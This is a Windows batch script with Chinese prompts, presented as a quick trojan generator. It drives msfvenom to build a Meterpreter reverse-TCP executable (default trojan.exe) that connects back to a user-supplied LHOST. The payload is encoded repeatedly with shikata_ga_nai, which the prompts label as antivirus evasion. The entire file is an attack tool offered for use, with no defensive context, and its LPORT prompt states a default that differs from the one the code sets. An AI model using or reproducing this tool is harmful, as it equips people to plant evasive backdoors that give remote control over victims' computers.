echo 快速木马生成程序
set void=

if "%1"=="-f" (if "%2"=="%void%" (echo LHOST配置错误&@goto exit) else (call %bin%\msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=%2 LPORT=2345 -b "\x00" -e x86/shikata_ga_nai -i 5 -f exe -o %kalindows%/trojan.exe&@goto exit))

:payload
set payload=windows/meterpreter/reverse_tcp
set /p payload=请输入payload(默认为windows/meterpreter/reverse_tcp):
if "%payload%"=="exit" (@goto exit)

:lhost
ipconfig
set /p LHOST=请输入LHOST:
if "%LHOST%"=="%void%" (@goto lhost)
if "%LHOST%"=="exit" (@goto exit)

:lport
set LPORT=4444
set /p LPORT=请输入LPORT(默认为2345):
if "%LPORT%"=="exit" (@goto exit)

:format
set format=exe
set /p format=请输入格式(默认为exe):
if "%format%"=="exit" (@goto exit)

:output
set output=%kalindows%
set /p output=请输入输出目录(默认为Kalindows根目录):
if "%output%"=="exit" (@goto exit)

:filename
set filename=trojan.exe
set /p filename=请输入文件名(默认为trojan.exe):
if "%filename%"=="exit" (@goto exit)

:incoder
set incoder=x86/shikata_ga_nai
set /p incoder=请输入免杀模块(默认为x86/shikata_ga_nai):
if "%incoder%"=="exit" (@goto exit)

:times
set times=8
set /p times=请输入免杀次数(默认为8):
if "%times%"=="exit" (@goto exit)

:generate
echo 正在生成，请坐和放宽
call %bin%\msfvenom -p %payload% LHOST=%LHOST% LPORT=%LPORT% -b "\x00" -e %incoder% -i %times% -f %format% -o %output%/%filename%
if exist "%output%/%filename%" (echo 成功，文件已保存至%output%/%filename%) else (echo 错误，请检查配置是否正确)

:exit